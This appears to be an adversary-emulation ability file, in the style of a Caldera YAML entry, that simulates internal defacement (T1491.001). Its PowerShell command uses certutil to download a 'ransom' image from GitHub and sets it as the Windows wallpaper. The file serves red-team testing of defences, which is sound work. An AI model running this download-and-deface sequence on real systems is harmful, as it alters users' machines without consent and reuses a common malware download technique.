- name: Download and modify user Wallpaper using PowserShell commands. 
  additional_info: {}
  plugin: ''
  executors:
  - name: psh
    code: null
    uploads: []
    command: "$Exf_File=\"$env:PUBLIC\\exf\\Download_back.log\";\n$DestinationFile\
      \ = \"$env:HOMEDRIVE\\$env:USERPROFILE\\Documents\\backgroundransom.jpg\";\n\
      $DownloadURL=\"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
      ;\n$CompleteCommand= \"certutil -urlcache -f \"+\" $DownloadURL\"\
      +\" $DestinationFile\";\nInvoke-Expression  $CompleteCommand | Out-File \"$Exf_File\"\
      ;\n$MyWallpaper=\"$DestinationFile\";\n\n$code = @@' \nusing System.Runtime.InteropServices;\
      \ \nnamespace Win32{ \n    \n     public class Wallpaper{ \n        [DllImport(\"\
      user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo\
      \ (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n\
      \         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);\
      \ \n         }\n    }\n } \n'@@\nadd-type $code; \n\n#Apply the Change on the\
      \ system \n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
    variations: []
    build_target: null
    cleanup: []
    language: null
    payloads: []
    platform: windows
    timeout: 60
    parsers: []
    additional_info: {}
  tactic: impact
  description: 'Downloads an image from a GitHUB and change it, to define as wallpaper. '
  technique_id: T1491.001
  requirements: []
  delete_payload: true
  privilege: ''
  technique_name: 'Defacement: Internal Defacement'
  singleton: false
  access: {}
  buckets:
  - impact
  repeatable: false
  id: desktop_change_ps
